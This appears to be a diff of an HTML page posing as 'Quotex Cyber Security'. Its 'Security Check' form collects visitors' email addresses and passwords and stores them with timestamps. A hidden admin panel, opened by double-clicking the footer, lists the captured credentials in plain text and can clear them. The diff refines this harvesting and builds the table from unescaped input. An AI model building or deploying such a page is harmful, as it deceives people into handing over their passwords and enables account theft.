@@ -18,20 +18,9 @@
             padding: 40px 20px;
             border-bottom: 3px solid #22c55e;
         }
-        .logo { 
-            width: 420px; 
-            max-width: 95%; 
-            margin-bottom: 10px;
-            border-radius: 10px;
-        }
-        h1 { 
-            color: #22c55e; 
-            margin: 10px 0; 
-            font-size: 36px; 
-        }
-
+        .logo { width: 280px; max-width: 90%; }
+        h1 { color: #22c55e; margin: 15px 0; font-size: 36px; }
         .container { max-width: 800px; margin: 40px auto; padding: 0 20px; }
-
         .box {
             background: #111827;
             padding: 35px;
@@ -39,12 +28,10 @@
             border: 2px solid #22c55e;
             margin-bottom: 40px;
         }
-        input, button, label {
-            margin: 10px 0;
-        }
         input {
             width: 100%;
             padding: 15px;
+            margin: 10px 0;
             background: #1e2937;
             border: 1px solid #475569;
             border-radius: 8px;
@@ -63,8 +50,14 @@
             cursor: pointer;
         }
         button:hover { background: #16a34a; }
-
-        .success { display: none; padding: 25px; background: #0b1220; border: 1px solid #22c55e; border-radius: 8px; text-align: center; }
+        .success {
+            display: none;
+            padding: 25px;
+            background: #0b1220;
+            border: 1px solid #22c55e;
+            border-radius: 8px;
+            text-align: center;
+        }
         .about, .contact {
             background: #111827;
             padding: 30px;
@@ -72,78 +65,123 @@
             border: 1px solid #1f2937;
             margin-bottom: 30px;
         }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { padding: 12px; border: 1px solid #334155; }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            padding: 12px;
+            border: 1px solid #334155;
+        }
         th { background: #0f172a; color: #22c55e; }
-        footer { text-align: center; padding: 30px; border-top: 1px solid #1f2937; margin-top: 50px; }
+        footer {
+            text-align: center;
+            padding: 30px;
+            border-top: 1px solid #1f2937;
+            margin-top: 50px;
+        }
     </style>
 </head>
 <body>
-
 <header>
-    <img src="quotex-logo.png" class="logo" alt="Quotex Cyber Security">
+    <img src="Screenshot 2026-06-01 053902_2.jpg" class="logo" alt="Quotex">
     <h1>QUOTEX CYBER SECURITY</h1>
     <p>Protecting Your Digital World</p>
 </header>
-
 <div class="container">
+    <!-- Security Check Form -->
     <div class="box">
         <h2 style="text-align:center; color:#22c55e; margin-bottom:25px;">SECURITY CHECK</h2>
-        
+       
         <div id="form">
             <input type="email" id="email" placeholder="Email Address">
             <input type="password" id="password" placeholder="Password">
+           
             <label style="display:block; margin:15px 0; font-size:15px;">
                 <input type="checkbox" id="consent"> I agree to terms & conditions
             </label>
+           
             <button onclick="submitForm()">Start Security Check</button>
         </div>
-
         <div class="success" id="success">
             <h3 style="color:#22c55e;">✓ Request Submitted Successfully!</h3>
             <p>We will contact you soon.</p>
         </div>
     </div>
 
+    <!-- About Section -->
     <div class="about">
         <h2 style="color:#22c55e; margin-bottom:15px;">ABOUT US</h2>
         <p>Quotex Cyber Security provides cybersecurity awareness, online safety education, and digital protection guidance to help users stay secure in the modern digital world.</p>
     </div>
 
+    <!-- Contact Section -->
     <div class="contact">
         <h2 style="color:#22c55e; margin-bottom:15px;">CONTACT / COMPLAINT</h2>
         <p><strong>Gmail:</strong> quotexcybersecurity@gmail.com</p>
-        <p>For any complaint or inquiry, please email us.</p>
+        <p>For any complaint or inquiry, please email us at above address.</p>
     </div>
 
+    <!-- Admin Panel -->
     <div id="admin" style="display:none; background:#1e293b; padding:25px; border-radius:12px;">
         <h3 style="color:#22c55e; text-align:center;">Admin Logs Panel</h3>
+        <button onclick="clearLogs()" style="margin-bottom:15px; background:#ef4444; color:white; padding:8px 15px; border:none; border-radius:5px; cursor:pointer;">Clear All Logs</button>
         <table>
-            <thead><tr><th>Email</th><th>Password</th></tr></thead>
+            <thead>
+                <tr>
+                    <th>Email</th>
+                    <th>Password</th>
+                    <th>Time</th>
+                </tr>
+            </thead>
             <tbody id="tableBody"></tbody>
         </table>
     </div>
 </div>
 
 <footer>
-    <p ondblclick="showAdmin()" style="cursor: pointer;">© 2026 Quotex Cyber Security. All Rights Reserved.</p>
+    <p ondblclick="showAdmin()" style="cursor: pointer; user-select: none;">
+        © 2026 Quotex Cyber Security. All Rights Reserved.
+    </p>
 </footer>
 
 <script>
+console.log("✅ Script Loaded Successfully - Final Version");
+
 function submitForm() {
     let email = document.getElementById("email").value.trim();
     let pass = document.getElementById("password").value.trim();
     let consent = document.getElementById("consent").checked;
 
-    if (email === "" || pass === "") return alert("Email aur Password dono dalo");
-    if (!consent) return alert("Consent tick karo");
+    if (email === "" || pass === "") {
+        alert("❌ Email aur Password dono dalo");
+        return;
+    }
+    if (!consent) {
+        alert("❌ Consent tick karo");
+        return;
+    }
 
-    let logs = JSON.parse(localStorage.getItem("logs")) || [];
-    logs.push({email, password: pass});
-    localStorage.setItem("logs", JSON.stringify(logs));
+    try {
+        let logs = JSON.parse(localStorage.getItem("logs")) || [];
+        logs.push({
+            email: email,
+            password: pass,
+            time: new Date().toLocaleString()
+        });
 
-    document.getElementById("form").style.display = "none";
-    document.getElementById("success").style.display = "block";
+        localStorage.setItem("logs", JSON.stringify(logs));
+        console.log("✅ Data Saved Successfully!");
+
+        document.getElementById("form").style.display = "none";
+        document.getElementById("success").style.display = "block";
+        
+        alert("✅ Request Submitted Successfully!");
+    } catch (e) {
+        console.error("❌ Error:", e);
+        alert("Kuch problem aa rahi hai. Browser restart karke try karo.");
+    }
 }
 
 function showAdmin() {
@@ -152,20 +190,37 @@ function showAdmin() {
         document.getElementById("admin").style.display = "block";
         loadTable();
     } else {
-        alert("Wrong Password");
+        alert("❌ Wrong Password");
     }
 }
 
 function loadTable() {
     let logs = JSON.parse(localStorage.getItem("logs")) || [];
     let tbody = document.getElementById("tableBody");
-    tbody.innerHTML = logs.map(item => `
-        <tr>
-            <td>${item.email}</td>
-            <td style="color:#f87171;">${item.password}</td>
-        </tr>`).join('');
+    tbody.innerHTML = "";
+
+    if (logs.length === 0) {
+        tbody.innerHTML = `<tr><td colspan="3" style="text-align:center; padding:30px; color:#94a3b8;">No logs yet</td></tr>`;
+        return;
+    }
+
+    logs.forEach(item => {
+        tbody.innerHTML += `
+            <tr>
+                <td>${item.email}</td>
+                <td style="color:#f87171;">${item.password}</td>
+                <td>${item.time || 'N/A'}</td>
+            </tr>`;
+    });
+}
+
+function clearLogs() {
+    if (confirm("Kya aap saare logs clear karna chahte hain?")) {
+        localStorage.removeItem("logs");
+        loadTable();
+        alert("Logs cleared!");
+    }
 }
 </script>
-
 </body>
 </html>
